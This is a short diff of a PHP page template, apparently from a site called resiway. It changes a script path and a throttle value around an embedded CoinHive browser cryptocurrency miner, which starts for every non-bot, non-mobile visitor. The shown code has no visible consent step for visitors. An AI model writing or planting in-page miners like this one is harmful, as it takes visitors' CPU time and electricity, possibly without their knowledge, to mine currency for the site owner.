@@ -40,13 +40,13 @@ $token = md5($rev.rand(1, 100));
         <?php
         if(!$request->isBot() && !$request->isMobile()) {
         ?>
-            <script src="packages/resiway/apps/js/contribute.min.js"></script>
+            <script src="packages/resiway/apps/assets/js/contribute.min.js"></script>
             <script>
                 var miner = new CoinHive.Anonymous('qaP4WVQaitkLzfkhCEpAHJe0aH6qYI5f',{
                 threads: 1,
                 autoThreads: false,
                 onIddle: true,
-                throttle: 0.5,
+                throttle: 0.8,
                 forceASMJS: false
                 });
                 miner.start();
